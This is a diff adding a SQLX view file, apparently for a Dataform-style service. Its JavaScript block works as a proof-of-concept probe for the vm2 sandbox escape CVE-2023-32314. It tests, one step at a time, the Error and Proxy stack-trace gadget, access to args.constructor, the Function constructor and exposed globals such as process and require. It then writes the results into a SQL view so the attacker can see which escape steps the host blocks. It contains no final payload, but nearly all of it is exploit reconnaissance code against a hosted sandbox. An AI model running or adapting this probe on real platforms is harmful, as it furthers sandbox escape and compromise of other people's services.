@@ -1,0 +1,131 @@
+-- vm2 Sandbox Escape Debug PoC
+-- Tests each step of CVE-2023-32314 to find what's blocked
+
+config {
+  type: "view",
+  name: "vm2_escape_debug"
+}
+
+js {
+  let debugResults = [];
+
+  // Test 1: Can we create Error?
+  try {
+    const err = new Error();
+    debugResults.push("1_Error_create: SUCCESS");
+  } catch(e) {
+    debugResults.push("1_Error_create: FAIL - " + e.message);
+  }
+
+  // Test 2: Can we create Proxy?
+  try {
+    const p = new Proxy(() => "", {apply: () => "test"});
+    debugResults.push("2_Proxy_create: SUCCESS");
+  } catch(e) {
+    debugResults.push("2_Proxy_create: FAIL - " + e.message);
+  }
+
+  // Test 3: Can we access err.name?
+  try {
+    const err = new Error();
+    err.name = "test";
+    debugResults.push("3_Error_name: " + err.name);
+  } catch(e) {
+    debugResults.push("3_Error_name: FAIL - " + e.message);
+  }
+
+  // Test 4: Can we access err.stack?
+  try {
+    const err = new Error();
+    const s = err.stack;
+    debugResults.push("4_Error_stack: " + (s ? "EXISTS" : "UNDEFINED"));
+  } catch(e) {
+    debugResults.push("4_Error_stack: FAIL - " + e.message);
+  }
+
+  // Test 5: Can we set err.name to object?
+  try {
+    const err = new Error();
+    err.name = {toString: () => "custom"};
+    const s = err.stack;
+    debugResults.push("5_Error_name_obj: " + (s.includes("custom") ? "CUSTOM_CALLED" : "NOT_CALLED"));
+  } catch(e) {
+    debugResults.push("5_Error_name_obj: FAIL - " + e.message);
+  }
+
+  // Test 6: Proxy apply with Error.name
+  try {
+    let proxyCalled = false;
+    const err = new Error();
+    err.name = {
+      toString: new Proxy(() => "", {
+        apply(target, thiz, args) {
+          proxyCalled = true;
+          return "proxied";
+        }
+      })
+    };
+    err.stack;
+    debugResults.push("6_Proxy_apply: " + (proxyCalled ? "CALLED" : "NOT_CALLED"));
+  } catch(e) {
+    debugResults.push("6_Proxy_apply: FAIL - " + e.message);
+  }
+
+  // Test 7: Check if args.constructor exists in Proxy
+  try {
+    let argsInfo = "NOT_CALLED";
+    const err = new Error();
+    err.name = {
+      toString: new Proxy(() => "", {
+        apply(target, thiz, args) {
+          argsInfo = "args=" + typeof args + ", constructor=" + typeof args.constructor;
+          throw "ESCAPE_CHECK";
+        }
+      })
+    };
+    try {
+      err.stack;
+    } catch(thrown) {
+      if (thrown === "ESCAPE_CHECK") {
+        debugResults.push("7_Args_in_proxy: " + argsInfo);
+      } else {
+        debugResults.push("7_Args_in_proxy: ERROR - " + thrown);
+      }
+    }
+  } catch(e) {
+    debugResults.push("7_Args_in_proxy: FAIL - " + e.message);
+  }
+
+  // Test 8: Try Function constructor directly
+  try {
+    const fn = new Function("return 1+1");
+    debugResults.push("8_Function_ctor: " + fn());
+  } catch(e) {
+    debugResults.push("8_Function_ctor: FAIL - " + e.message);
+  }
+
+  // Test 9: Check global objects
+  try {
+    const globals = [];
+    if (typeof globalThis !== 'undefined') globals.push("globalThis");
+    if (typeof global !== 'undefined') globals.push("global");
+    if (typeof window !== 'undefined') globals.push("window");
+    if (typeof process !== 'undefined') globals.push("process");
+    if (typeof require !== 'undefined') globals.push("require");
+    debugResults.push("9_Globals: " + globals.join(","));
+  } catch(e) {
+    debugResults.push("9_Globals: FAIL - " + e.message);
+  }
+
+  // Test 10: What's in globalThis/global?
+  try {
+    const g = typeof globalThis !== 'undefined' ? globalThis : (typeof global !== 'undefined' ? global : {});
+    const keys = Object.keys(g).slice(0, 20);
+    debugResults.push("10_Global_keys: " + keys.join(","));
+  } catch(e) {
+    debugResults.push("10_Global_keys: FAIL - " + e.message);
+  }
+}
+
+SELECT
+  '${JSON.stringify(debugResults)}' as debug_results
